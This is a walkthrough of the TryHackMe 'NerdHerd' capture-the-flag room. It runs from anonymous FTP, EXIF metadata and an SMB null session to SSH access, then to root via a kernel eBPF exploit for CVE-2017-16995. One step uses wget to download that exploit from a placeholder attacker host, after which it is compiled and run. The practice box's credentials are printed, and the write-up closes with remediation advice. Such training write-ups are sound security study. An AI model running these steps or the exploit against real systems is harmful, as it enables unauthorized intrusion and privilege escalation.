# TryHackMe: NerdHerd — Chasing Chuck Through FTP, SMB, and a Song Lyric

*A walkthrough of the "NerdHerd" room. This one is a breadcrumb hunt: anonymous
FTP hands you a picture and a hint, EXIF metadata hides an encoded password, an
SMB null session leaks the only username you need, and a web page quietly points
you at a song whose single-line lyric is the decryption key. String it together
and you SSH in as `chuck`, then ride an old kernel to root.*

> Flag values are redacted. NerdHerd is a retired training box on TryHackMe;
> everything here was done against an authorized practice target.

---

## TL;DR — the whole chain

Anon FTP → PNG + `.jokesonyou` hint ("all you need is in the leet") → `exiftool`
leaks an encoded owner name → SMB null session leaks user **chuck** → port
**1337** web app + the *Surfin' Bird* hint ("bird is the word") decodes the string
to **chuck's password** → SMB share `nerdherd_classified` → `secr3t.txt` points at
a hidden web path → **SSH password** for chuck → user flag → kernel 4.4 eBPF LPE
(**CVE-2017-16995**) → **root**.

## The target

```bash
export IP=<target-ip>
nmap -sC -sV -p- -T4 --min-rate=1000 $IP
```

```
21/tcp   open  ftp         vsftpd 3.0.3        # anonymous login allowed
22/tcp   open  ssh         OpenSSH 7.2p2 (Ubuntu)
139/tcp  open  netbios-ssn Samba smbd 3.X-4.X
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu
1337/tcp open  http        Apache 2.4.18 (Ubuntu)   # "It works" default page
```

Five ports, three of them talkative: anonymous FTP, an SMB stack that loves null
sessions, and an HTTP service parked on port **1337** — "leet", which turns out
to be a hint in itself.

## FTP: the first breadcrumb

`nmap` already flagged anonymous login, so walk in:

```bash
ftp -A $IP        # user: anonymous
```

`pub/` holds `youfoundme.png` and a hidden directory `.jokesonyou/` with a tiny
text file:

```bash
cat hellon3rd.txt
# all you need is in the leet
```

"The leet" = port **1337**. So the web app is where the puzzle continues — but
first, squeeze the image.

## EXIF: a password hiding in the metadata

Never trust an innocent-looking PNG on a CTF box. `exiftool` on `youfoundme.png`
surfaces an out-of-place field:

```bash
exiftool youfoundme.png
# ...
# Owner Name : fijbxslz
```

`fijbxslz` is not random — it's an encoded secret. We just don't have the key
yet. Park it and go find whose password it is.

## SMB: a null session hands us the username

Samba here allows an unauthenticated (null) session, so `enum4linux` gets to work:

```bash
enum4linux $IP
```

Two things matter in the noise:

- A user account — **`chuck`** (full name *ChuckBartowski*, a *Chuck* TV nod).
- A share, **`nerdherd_classified`**, that looks juicy but needs credentials.

```
user:[chuck] rid:[0x3e8]

Sharename            Type   Comment
nerdherd_classified  Disk   Samba on Ubuntu     # Mapping: DENIED without creds
```

Now we have a username and an encoded password blob. We need the key that ties
them together — and that's on the website.

## HTTP 1337: rabbit holes and a song

Directory brute force finds an admin area (and a few dead ends built to waste
your time):

```bash
gobuster dir -u http://$IP:1337/ -w /usr/share/wordlists/dirb/big.txt -t 100 -x php,txt,js,html,bak
# /admin  (301)   .htpasswd.html (403) ...
```

Trying to bypass the `/admin/` login is one of the intended rabbit holes. The
real thread is a line at the bottom of the index page — *"Maybe the answer is in
here"* — linking to a YouTube video. The song is **"Surfin' Bird"** by The
Trashmen, whose entire lyric is essentially:

> bird is the word

That's the decryption key. The encoded EXIF string `fijbxslz` is a **Vigenère**
ciphertext; decrypt it with the key **`bird`** and it resolves to `chuck`'s
password:

```
fijbxslz  --Vigenère(key="bird")-->  easypass
```

(There's also a base64 crumb on the page — `Y2liYXJ0b3dza2k=` decodes to
`cibartowski`, reinforcing that Chuck Bartowski is our target user.)

## Foothold, part 1: into the classified share

With `chuck : easypass`, the SMB share opens:

```bash
smbmap -H $IP -d WORKGROUP -u chuck -p easypass
# nerdherd_classified   READ ONLY

smbclient -U chuck //$IP/nerdherd_classified
smb: \> get secr3t.txt
```

```bash
cat secr3t.txt
# Ssssh! ... check out "/this1sn0tadirect0ry"
# Sincerely, 0xpr0N3rd
```

Another redirect — this time to a hidden path on the web server.

## Foothold, part 2: the SSH password

Browsing to `http://$IP:1337/this1sn0tadirect0ry` yields SSH credentials for
chuck (a *different* password from the SMB one — the box keeps making you chase):

```
chuck : th1s41ntmypa5s
```

```bash
ssh chuck@$IP        # password: th1s41ntmypa5s
```

```
chuck@nerdherd:~$ cat user.txt
THM{<redacted>}
```

User flag captured.

## Privilege escalation: an ancient kernel

Enumeration is short here — check the kernel first, because there's a compiler
on the box (a strong hint the intended path is a kernel exploit):

```bash
chuck@nerdherd:~$ uname -a
# Linux nerdherd 4.4.0-31-generic ... Ubuntu ... 2016 x86_64
```

Kernel **4.4.0-31** (2016) is vulnerable to the eBPF verifier bug
**CVE-2017-16995** — a reliable local privilege escalation to root. Pull the PoC
([Exploit-DB 45010](https://www.exploit-db.com/exploits/45010)), compile it *on
the target* since `gcc` is present, and run it:

```bash
# on attacker: python3 -m http.server 8000  (serving CVE-2017-16995.c)
chuck@nerdherd:/tmp$ wget http://<attacker-ip>:8000/CVE-2017-16995.c
chuck@nerdherd:/tmp$ gcc CVE-2017-16995.c -o exploit
chuck@nerdherd:/tmp$ ./exploit
# [*] credentials patched, launching shell...
# id
uid=0(root) gid=0(root) groups=0(root),...
```

## The troll flags

The box owner (`0xpr0N3rd`) had fun with the root flag. `/root/root.txt` is a
decoy:

```bash
# cat /root/root.txt
# cmon, wouldnt it be too easy if i place the root flag here?
```

The real one is hiding elsewhere — a filesystem-wide grep finds it:

```bash
# grep -rn 'THM' / 2>/dev/null
# opt/.root.txt:3:THM{<redacted>}
```

And there's a **bonus flag** tucked into root's shell history:

```bash
# cat /root/.bash_history
# ... rm youfoundme.png
# THM{<redacted>}
```

## Severity

**High.** The chain requires no exploit to *start* — anonymous FTP, an SMB null
session, and a public web app leak everything needed to authenticate. Weak,
reused, and hint-decodable passwords hand over a shell, and an unpatched 2016
kernel finishes the job with a public, reliable local exploit.

## Remediation — break the chain at any rung

1. **Lock down anonymous access.** Disable anonymous FTP and the SMB null session
   (`restrict anonymous`, require authentication) so recon can't harvest a
   username and hints for free.
2. **Don't hide secrets in plain sight.** EXIF metadata, "hidden" directories,
   and obscure web paths are not access controls. Strip metadata from published
   files.
3. **Use real passwords.** `easypass` / `th1s41ntmypa5s` are guessable and
   puzzle-decodable; enforce length and complexity, and never encode a password
   with a key the app itself hands out.
4. **Patch the kernel.** 4.4.0-31 is years of missed updates. Keep kernels
   current so a single local exploit isn't an instant win, and remove compilers
   from production hosts.

## Takeaways

- **`exiftool` first, always.** The password blob was sitting in the image
  metadata the whole time.
- **Null sessions are gifts.** One `enum4linux` run gave us the only username the
  box needed.
- **Read every clue literally.** "in the leet" → port 1337, "bird is the word" →
  the Vigenère key. CTF hints are usually exactly what they say.
- **Old kernel = fast root.** Check `uname -a` early; a compiler on the box is a
  neon sign pointing at a kernel LPE.

Thanks for reading. NerdHerd is a proper scavenger hunt — FTP to EXIF to SMB to a
song lyric to SSH — and a reminder that the hardest part of some boxes is simply
noticing the breadcrumb you were handed three steps ago.
